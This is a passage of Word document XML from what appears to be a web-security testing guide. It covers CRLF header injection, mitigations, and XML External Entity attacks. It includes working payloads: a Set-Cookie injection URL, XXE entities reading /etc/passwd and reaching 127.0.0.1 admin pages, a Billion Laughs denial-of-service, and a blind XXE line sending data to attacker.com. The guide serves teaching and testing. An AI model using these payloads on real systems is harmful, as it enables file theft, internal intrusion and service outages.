          </w:rPr>
          <w:t>https://example.com/page?lang=en%0d%0aSet-Cookie:role=admin</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00A73954">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>→ Injects new Set-Cookie header.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A67B5A" w14:textId="3479D955" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Cache Poisoning via Response Splitting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D6EADC" w14:textId="77777777" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use CRLF to add malicious headers like Cache-Control or Content-Type, causing poisoned cached responses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FCD87C" w14:textId="43FBDF1E" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="00A73954">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="183" w:name="_Toc208408654"/>
      <w:r>
        <w:t>Mitigation Strategies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="183"/>
    </w:p>
    <w:p w14:paraId="7797BC05" w14:textId="77777777" w:rsidR="00A73954" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Never trust hidden fields or client-controlled values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDDCF90" w14:textId="77777777" w:rsidR="00A73954" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Store sensitive state server-side.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D34476C" w14:textId="77777777" w:rsidR="00A73954" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Apply contextual output encoding for response values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797906EF" w14:textId="77777777" w:rsidR="00A73954" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Sanitize/normalize CRLF sequences.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D827B7" w14:textId="77777777" w:rsidR="00A73954" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Validate roles, prices, and privileges server-side.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE4AF52" w14:textId="25CCB8BE" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Apply secure response headers (X-Content-Type-Options, CSP, X-Frame-Options).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DED7E9C" w14:textId="417599FA" w:rsidR="00213F0C" w:rsidRPr="00766792" w:rsidRDefault="00766792">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:divId w:val="1371153066"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri"/>
          <w:color w:val="366091"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="184" w:name="_Toc208408655"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri"/>
          <w:color w:val="366091"/>
        </w:rPr>
        <w:t>XML External ENTITY Attack (XXE)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="184"/>
    </w:p>
    <w:p w14:paraId="1B1F3257" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>XML External Entity Injection (XXE) happens when an application processes untrusted XML input with a parser that allows custom entities. Attackers define malicious entities in XML and the parser expands them, leading to file disclosure, SSRF, denial of service, or sometimes remote code execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DAFD43" w14:textId="45CB3AF8" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="009C3BFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="185" w:name="_Toc208408656"/>
      <w:r>
        <w:t>How XXE Works</w:t>
      </w:r>
      <w:bookmarkEnd w:id="185"/>
    </w:p>
    <w:p w14:paraId="6A32BC05" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>XML parsers support entities (named references that are substituted at runtime). If user input controls these entities, attackers can make the parser load files, request URLs, or expand recursively.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3763ED00" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;!DOCTYPE foo [ &lt;!ENTITY company "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>OpenAI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>"&gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;data&gt;&amp;company;&lt;/data&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>→ Expands to &lt;data&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>OpenAI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;/data&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F87E308" w14:textId="59A398BE" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="009C3BFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="186" w:name="_Toc208408657"/>
      <w:r>
        <w:t>Types of XXE Attacks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="186"/>
    </w:p>
    <w:p w14:paraId="6B1D6F10" w14:textId="22D6FB2B" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="009C3BFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="187" w:name="_Toc208408658"/>
      <w:r>
        <w:t>File Disclosure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="187"/>
    </w:p>
    <w:p w14:paraId="633AABC0" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "file:///</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>"&gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;data&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>;&lt;/data&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDBD704" w14:textId="46924DD4" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="00E428B8">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="188" w:name="_Toc208408659"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>SSRF (Server-Side Request Forgery)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="188"/>
    </w:p>
    <w:p w14:paraId="78D48E5D" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://127.0.0.1:8080/admin"&gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;data&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>;&lt;/data&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6684CB" w14:textId="64AD8072" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="00E428B8">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="189" w:name="_Toc208408660"/>
      <w:r>
        <w:t>Denial of Service (Billion Laughs)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="189"/>
    </w:p>
    <w:p w14:paraId="31010EBA" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!DOCTYPE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lolz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> [</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> &lt;!ENTITY a "lol"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> &lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> &lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;data&gt;&amp;c;&lt;/data&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109ECB24" w14:textId="0489C17C" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="00E428B8">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="190" w:name="_Toc208408661"/>
      <w:r>
        <w:t>Out-of-Band XXE (Blind XXE)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="190"/>
    </w:p>
    <w:p w14:paraId="36E3E830" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://attacker.com/?data=/etc/passwd"&gt; ]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604F578C" w14:textId="665C9525" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="00E428B8">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="191" w:name="_Toc208408662"/>
      <w:r>
        <w:t>XXE to RCE</w:t>
      </w:r>
      <w:bookmarkEnd w:id="191"/>
    </w:p>
    <w:p w14:paraId="5EDE7517" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In rare cases, parser-specific protocols (e.g., Java JAR) can be abused to achieve remote code execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173EEE64" w14:textId="18D1E57C" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="00E428B8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="192" w:name="_Toc208408663"/>
      <w:r>
        <w:t>Detection Workflow</w:t>
      </w:r>
      <w:bookmarkEnd w:id="192"/>
    </w:p>
    <w:p w14:paraId="711B47B9" w14:textId="77777777" w:rsidR="0014730E" w:rsidRPr="0014730E"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Spot XML inputs: Content-Type application/xml, SOAP, SAML, XML uploads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13986C43" w14:textId="77777777" w:rsidR="0014730E" w:rsidRPr="0014730E"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Probe with harmless ENTITY: &lt;!ENTITY test "VULN"&gt;.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497128AB" w14:textId="77777777" w:rsidR="0014730E" w:rsidRPr="0014730E"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Try file disclosure with local paths.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CFFBDE" w14:textId="77777777" w:rsidR="0014730E" w:rsidRPr="0014730E"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Attempt SSRF with internal URLs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="036E3980" w14:textId="77777777" w:rsidR="0014730E" w:rsidRPr="0014730E"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Use Blind XXE with OAST (Burp Collaborator).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644C2F8B" w14:textId="6CE40A5B" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Test </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> payloads in controlled labs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C8D0B2" w14:textId="01C8FB0D" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="00E428B8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="193" w:name="_Toc208408664"/>
      <w:r>
        <w:t>Exploitation Techniques</w:t>
      </w:r>
      <w:bookmarkEnd w:id="193"/>
    </w:p>
    <w:p w14:paraId="163E59FE" w14:textId="77777777" w:rsidR="006572CB" w:rsidRPr="006572CB" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Local File Inclusion: leak /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, C:\Windows\win.ini</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC1E799" w14:textId="77777777" w:rsidR="006572CB" w:rsidRPr="006572CB" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SSRF: force server to fetch internal URLs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B52716" w14:textId="118E4D18" w:rsidR="006572CB" w:rsidRPr="006572CB" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
